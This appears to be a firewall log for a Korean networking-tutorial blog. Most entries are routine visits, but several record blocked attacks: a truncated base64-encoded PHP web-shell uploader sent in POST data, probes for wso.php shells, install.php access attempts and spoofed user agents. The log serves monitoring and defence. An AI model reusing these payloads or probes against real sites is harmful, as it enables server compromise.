+20/Oct/25 07:54:48  #2722015  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+20/Oct/25 07:54:58  #7355046  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+20/Oct/25 07:55:07  #2488711  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+20/Oct/25 07:55:10  #8624074  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 
+
+20/Oct/25 07:55:43  #5053720  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%eb%a7%9d-%ea%b5%ac%ec%a1%b0%ec%99%80-%ed%97%88%eb%b8%8c-%eb%b0%8f-%ec%8a%a4%ec%9c%84%ec%b9%98/] - coffeecrawlers.com 
+
+20/Oct/25 07:55:47  #5793396  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+20/Oct/25 07:55:55  #6799921  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+20/Oct/25 07:56:01  #6033030  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/?s=%ED%83%9C%EA%B7%B8] - coffeecrawlers.com 
+
+20/Oct/25 22:46:30  #3869565  INFO         -  185.40.4.29      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 
+
+20/Oct/25 22:46:30  #1185353  INFO         -  185.40.4.29      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 
+
+20/Oct/25 22:46:38  #6107960  INFO         -  45.9.156.101     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 
+
+20/Oct/25 22:46:38  #8028571  INFO         -  45.9.156.101     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 
+
+22/Oct/25 04:44:35  #4913567  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%8b%9c%eb%ae%ac%eb%a0%88%ec%9d%b4%ec%85%98/] - coffeecrawlers.com 
+
+22/Oct/25 04:57:36  #5196823  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+22/Oct/25 04:57:37  #3729408  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%8b%9c%eb%ae%ac%eb%a0%88%ec%9d%b4%ec%85%98/] - coffeecrawlers.com 
+
+22/Oct/25 05:07:55  #1741859  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+23/Oct/25 01:37:18  #1037121  INFO         -  61.108.4.18      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+23/Oct/25 06:57:17  #3909580  MEDIUM     531  35.204.145.47    GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Scrapy/2.13.3 (+https://scrapy.org)] - coffeecrawlers.com 
+
+24/Oct/25 22:03:37  #8253106  INFO         -  121.139.68.4     POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2Fpost.php%3Fpost%3D97%26action%3Dedit&reauth=1] - coffeecrawlers.com 
+
+26/Oct/25 02:47:21  #3411368  MEDIUM     306  204.76.203.31    GET /index.php - Bogus user-agent signature - [SERVER:HTTP_USER_AGENT = Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)] - coffeecrawlers.com 
+
+26/Oct/25 04:34:57  #7517267  CRITICAL     -  20.41.74.116     POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+26/Oct/25 04:34:58  #3191333  CRITICAL     -  20.41.74.116     POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+26/Oct/25 04:41:06  #5467390  INFO         -  121.139.68.4     GET /wp-admin/post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%8b%9c%eb%ae%ac%eb%a0%88%ec%9d%b4%ec%85%98/] - coffeecrawlers.com 
+
+26/Oct/25 06:19:07  #7760278  INFO         -  121.139.68.4     POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+29/Oct/25 20:10:45  #2964599  INFO         -  2.73.130.229     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+29/Oct/25 20:10:46  #3131496  INFO         -  2.73.130.229     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+29/Oct/25 20:10:49  #2132862  INFO         -  2.73.130.229     POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+29/Oct/25 20:10:50  #5719085  INFO         -  2.73.130.229     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-7] - coffeecrawlers.com 
+
+30/Oct/25 05:59:51  #5719927  INFO         -  185.220.101.6    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 
+
+30/Oct/25 05:59:51  #2357312  INFO         -  185.220.101.6    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 
+
+30/Oct/25 06:00:00  #4424691  INFO         -  185.220.101.6    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 
+
+30/Oct/25 06:00:01  #5469424  INFO         -  185.220.101.6    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 
+
+03/Sep/25 04:34:57  #2534067  INFO         -  121.139.68.4     POST /wp-login.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/wp-login.php?redirect_to=http%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+04/Sep/25 10:43:52  #3128237  MEDIUM     531  35.204.166.221   GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Scrapy/2.12.0 (+https://scrapy.org)] - www.coffeecrawlers.com 
+
+04/Sep/25 15:03:33  #1520193  MEDIUM     531  62.90.126.233    GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; HTMLScanner/1.0)] - coffeecrawlers.com 
+
+04/Sep/25 15:03:34  #1303657  MEDIUM     531  62.90.126.233    GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; HTMLScanner/1.0)] - coffeecrawlers.com 
+
+13/Sep/25 08:41:01  #1996881  INFO         -  78.29.53.57      GET /index.php - Sanitising user input - [HTTP_USER_AGENT: IN CHELYABINSK, RUSSIA LEARN HOW AVOID MEDICAL AND FOOD LAW. IT'S NOT VIR. WELCOME CHINESE TO CHELYABINSK, FOR ADULT ADOPTION! CU_coffeecrawlers.com] - coffeecrawlers.com 
+
+16/Sep/25 00:42:26  #7748573  MEDIUM     306  45.148.10.248    GET /index.php - Bogus user-agent signature - [SERVER:HTTP_USER_AGENT = Mozilla/2.0 (compatible; Ask Jeeves/Teoma)] - coffeecrawlers.com 
+
+17/Sep/25 13:45:13  #4728200  MEDIUM     306  213.209.157.108  GET /index.php - Bogus user-agent signature - [SERVER:HTTP_USER_AGENT = Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5] - coffeecrawlers.com 
+
+22/Sep/25 07:57:11  #4148723  HIGH      1366  4.230.45.55      GET /wp-admin/install.php - Unauthorized file access - [SERVER:SCRIPT_NAME = /wp-admin/install.php] - coffeecrawlers.com 
+
+22/Sep/25 22:20:11  #4685579  INFO         -  121.139.68.4     POST /wp-login.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/wp-login.php?redirect_to=http%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+23/Sep/25 06:43:39  #3646992  MEDIUM     531  35.204.69.78     GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Scrapy/2.12.0 (+https://scrapy.org)] - coffeecrawlers.com 
+
+23/Sep/25 09:24:35  #1841178  HIGH      1366  52.141.44.75     GET /wp-admin/install.php - Unauthorized file access - [SERVER:SCRIPT_NAME = /wp-admin/install.php] - coffeecrawlers.com 
+
+23/Sep/25 11:09:33  #3657197  INFO         -  167.71.195.78    GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com//wp-content/wso.php#UEjlZcWL%23UEjlZcWL] - coffeecrawlers.com 
+
+23/Sep/25 11:09:34  #8604365  INFO         -  167.71.195.78    GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com//wp-includes/wso.php#UEjlZcWL%23UEjlZcWL] - coffeecrawlers.com 
+
+24/Sep/25 13:38:44  #5748402  MEDIUM     306  13.217.198.103   GET /index.php - Bogus user-agent signature - [SERVER:HTTP_USER_AGENT = Mozilla/3.01Gold (Win95; I)] - coffeecrawlers.com 
+
+25/Sep/25 06:54:34  #8332506  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-1-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%9d%bc%eb%b0%98/] - coffeecrawlers.com 
+
+25/Sep/25 06:54:44  #6440731  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 
+
+25/Sep/25 07:39:35  #3181436  INFO         -  121.139.68.4     POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+25/Sep/25 07:41:07  #4627955  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 
+
+26/Sep/25 00:22:21  #8068404  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/series/2%ec%9e%a5-%ec%9d%b4%eb%8d%94%eb%84%b7%ea%b3%bc-%eb%ac%bc%eb%a6%ac-%ea%b3%84%ec%b8%b5/] - coffeecrawlers.com 
+
+26/Sep/25 00:22:27  #4182866  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+26/Sep/25 00:22:31  #4740695  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+26/Sep/25 00:22:34  #4025533  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+26/Sep/25 00:22:38  #8482789  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-%ec%8a%a4%ec%9c%84%ec%b9%98/] - coffeecrawlers.com 
+
+26/Sep/25 00:22:40  #1222876  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+26/Sep/25 00:22:42  #8830963  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+26/Sep/25 00:39:03  #8112773  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-1-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%9d%bc%eb%b0%98/] - coffeecrawlers.com 
+
+26/Sep/25 01:26:00  #2539873  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+26/Sep/25 01:50:04  #7578639  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+26/Sep/25 01:50:18  #8957387  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-%ec%8a%a4%ec%9c%84%ec%b9%98/] - coffeecrawlers.com 
+
+26/Sep/25 01:50:21  #1165495  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+26/Sep/25 01:50:25  #2482477  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+26/Sep/25 06:50:18  #3033674  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+26/Sep/25 23:58:59  #5265477  INFO         -  2.73.152.20      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+26/Sep/25 23:59:00  #5730488  INFO         -  2.73.152.20      POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+26/Sep/25 23:59:02  #8147281  INFO         -  2.73.152.20      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+28/Sep/25 10:42:43  #2263003  CRITICAL     -  196.251.86.100   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+28/Sep/25 22:48:49  #8538930  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+29/Sep/25 12:32:04  #1141039  INFO         -  61.83.227.119    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+29/Sep/25 12:32:31  #1655881  INFO         -  61.83.227.119    POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+30/Sep/25 22:12:06  #4089342  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:12:08  #6687566  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:12:11  #4792681  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:12:58  #7106147  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:13:00  #2944980  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:13:06  #6967856  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:13:11  #1169590  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:13:33  #5662477  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:13:37  #6892277  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:13:49  #4260244  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:14:18  #4570359  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:14:21  #8458891  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:14:23  #2415865  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:14:24  #5705260  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:15:16  #8667019  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 22:15:18  #8512450  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 22:15:19  #2358022  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 22:15:21  #1059966  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 22:15:28  #1182751  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 22:15:48  #7747871  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:15:55  #5578294  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
